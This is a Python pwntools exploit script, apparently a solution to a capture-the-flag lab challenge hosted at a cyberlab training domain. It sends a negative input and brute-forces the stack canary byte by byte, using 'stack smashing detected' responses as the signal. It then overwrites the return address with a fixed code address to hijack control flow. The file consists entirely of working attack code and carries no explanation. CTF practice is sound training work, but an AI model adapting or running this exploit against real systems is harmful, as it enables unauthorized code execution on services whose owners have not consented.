from pwn import *

port = 1231
domain = "cyberlab.infinitylabs.co.il"
canary = b""
base = b"A" *8
guess = 0x0
c = remote(domain,port)
#context.log_level='debug'
cookie_number = (c.recvline_endswith("?"))  # how many cockies
print(cookie_number)
number = b"-1"
c.sendline(number)

while len(canary) < 8:
    while guess != 0xff:
        try:
            taste=c.recvuntil(b"Butter.\n")
            c.send(base + p8(guess))
            answer = c.recvline()
            if answer not in b'*** stack smashing detected ***: terminated\n':
                #print ("Guessed correct byte:", format(guess, '02x'))
                canary += p8(guess)
                base += p8(guess)
                guess = 0x0
                print("add to guess")
                break
            else:
                guess+=1
        except EOFError:
                pass
                
new_payload = base + (b"A" *8) + p64(0x4012b6)
print("payload:",new_payload)
c.sendafter(b'Butter.\n',new_payload)
print(c.recvline())